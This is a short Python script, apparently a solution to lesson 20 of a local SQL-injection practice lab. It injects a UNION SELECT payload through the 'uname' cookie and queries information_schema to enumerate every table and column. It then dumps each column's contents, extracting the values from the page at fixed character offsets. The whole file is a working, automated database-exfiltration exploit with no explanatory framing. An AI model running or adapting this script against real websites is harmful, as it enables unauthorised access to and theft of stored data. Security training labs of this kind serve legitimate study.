import requests

get_table = "(select group_concat(table_name) from information_schema.tables where table_schema= database())"
get_column = "(select group_concat(column_name) from information_schema.columns where table_name = '{0}')"
get_secret = "(select group_concat({0}) from {1})"
url = "http://localhost:1234/Less-20/"
session = requests.Session()



payload = "' union select 1,{},3#"


cookies = {"uname": payload.format(get_table)}
response = requests.post(url,cookies=cookies)
while('Subquery returns more than 1 row' in response.text):
    response = requests.post(url,cookies=cookies)
temp = response.text[839+len(payload.format(get_table)):-233]
tables = temp.split(',')
for i in tables:
    print("From Table", i, ": ")
    find = get_column.format(i)
    cookies = {"uname": payload.format(find)}
    response = requests.post(url, cookies=cookies)
    while('Subquery returns more than 1 row' in response.text):
        response = requests.post(url, cookies=cookies)
    temp = response.text[839+len(payload.format(find)):-233]
    columns=temp.split(',')
    print("Columns : ",*columns)
    for j in columns:
        print("From Column ", j, " - ",end='')
        find = get_secret.format(j,i)
        cookies = {"uname": payload.format(find)}
        response = requests.post(url, cookies=cookies)
        while('Subquery returns more than 1 row' in response.text):
            response = requests.post(url, cookies=cookies)
        print(response.text[839+len(payload.format(find)):-233])
